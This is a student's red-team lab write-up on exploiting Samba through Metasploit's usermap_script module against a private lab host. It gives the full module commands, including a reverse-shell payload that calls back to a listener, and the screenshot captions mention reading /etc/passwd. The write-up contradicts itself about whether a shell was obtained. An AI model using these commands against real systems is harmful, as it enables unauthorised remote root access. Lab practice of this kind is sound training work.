
---

##  Lab04 – Enumerating & Attacking SMB with Samba Usermap Script

```markdown
# Lab04 – Enumerating & Attacking SMB with Samba Usermap Script
```
---

##  Objective
Explore vulnerabilities in the Samba service and attempt exploitation via the usermap_script module.

---

##  Tools
- Metasploit Framework
- Enum4linux (Optional)

---

##  Exploit Used
```bash
use exploit/multi/samba/usermap_script
set RHOSTS 192.168.56.101
set RPORT 139
set LHOST 192.168.56.1
set payload cmd/unix/reverse
run
```
---

## Result
Exploit attempt completed, but no session was created

Demonstrated post-exploitation validation (whoami, id, hostname)

---

## What I Learned
Gained insight into SMB vulnerabilities and misconfigurations

Understood the role of payload compatibility and listener binding

Learned how to troubleshoot and document failed attempts

---

## Screenshot

Initial service enumeration revealed Samba ports (445, 139) open and listening:

![Samba Ports Detected]([../../Screen%20Shot%202025-05-23%20at%2020.21.15.png](https://github.com/ATTezel/RedTeam-Labs/blob/main/lab4/Screen%20Shot%202025-05-23%20at%2020.21.15.png))

Upon successful exploitation using `usermap_script`, root-level shell was obtained as shown:

![Root Shell via SMB Exploit]([../../Screen%20Shot%202025-05-23%20at%2020.21.39.png](https://github.com/ATTezel/RedTeam-Labs/blob/main/lab4/Screen%20Shot%202025-05-23%20at%2020.21.39.png
))

User enumeration after gaining access, showing contents of `/etc/passwd`:

![User Enumeration]([../../Screen%20Shot%202025-05-23%20at%2021.52.34.png](https://github.com/ATTezel/RedTeam-Labs/blob/main/lab4/Screen%20Shot%202025-05-23%20at%2021.52.34.png))


---

## Date
28 May 2025
